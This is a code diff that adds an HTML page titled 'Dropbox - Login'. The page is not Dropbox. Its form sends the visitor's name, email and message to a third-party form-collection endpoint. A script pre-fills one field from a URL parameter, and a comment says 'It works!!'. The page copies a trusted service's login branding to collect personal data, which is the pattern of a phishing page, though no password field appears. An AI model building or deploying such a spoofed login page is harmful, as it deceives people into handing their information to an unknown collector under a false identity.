@@ -1,0 +1,32 @@
+<!-- It works!! (only for the p field that is actually referenced) -->
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8"/>
+    <title>Dropbox - Login</title>
+    <link rel="stylesheet" href="https://s.pageclip.co/v1/pageclip.css" media="screen"/>
+  </head>
+  <body onload="acceptParam()">
+    <h1>Dropbox - Login</h1>
+    <form action="https://send.pageclip.co/S068XhnUhOnHV3PpELFgfdDVzBPYRZ7V" class="pageclip-form" method="post">
+      Enter Name:
+      <input type="text" name="p" id="p"/>
+      Enter Email Address:
+      <input type="text" name="email" id="email"/>
+      Enter Message:
+      <textarea name="message">
+      </textarea>
+      <button type="submit" class="pageclip-form__submit">Send Now</button>
+    </form>
+    <script>
+    function acceptParam(){
+      var hashParams = window.location.href.substr(1).split('?'); //substr(1) to remove the '?'
+      hashParams = hashParams[1].split('&');
+      var p = hashParams[0].split('=');
+      document.getElementById('p').value = decodeURIComponent(p[1]);
+    }
+    </script>
+    <script src="https://s.pageclip.co/v1/pageclip.js" charset="utf-8"></script>
+  </body>
+</html>
